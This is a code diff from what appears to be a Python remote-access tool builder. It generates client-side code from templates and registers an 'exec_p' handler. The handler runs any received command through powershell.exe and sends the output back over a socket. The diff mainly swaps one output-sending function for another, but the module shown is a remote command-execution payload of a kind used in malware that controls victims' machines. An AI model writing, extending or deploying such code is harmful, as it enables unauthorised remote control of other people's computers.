@@ -1,10 +1,9 @@
-# WEB + COM
+# GUI + CUI
 # done
 import library.modules.config as config
+
 config.main()
 interface = config.interface
-if interface == "GUI":
-    from flask import jsonify
 
 
 def main(option):
@@ -17,12 +16,12 @@ def exec_p(execute):
     if execute[:3] == 'cd ':
         execute = execute.replace('cd ', '', 1)
         chdir(execute)
-        main_send("[+]Changed to directory : " + execute, s)
+        send_all(s,"[+]Changed to directory : " + execute)
     else:
         result = Popen('powershell.exe ' + execute, shell=True, stdout=PIPE, stderr=PIPE,
                        stdin=PIPE)
-        result = result.stdout.read() + result.stderr.read()
-        main_send('[+]Command output : \\n' + result.decode())''')
+        result = result.stdout.read() + result.stderr.read() 
+        send_all(s,'[+]Command output : \\n' + result.decode())''')
         config.logics.append('''
             elif command == "exec_p":
                 exec_p(data)''')
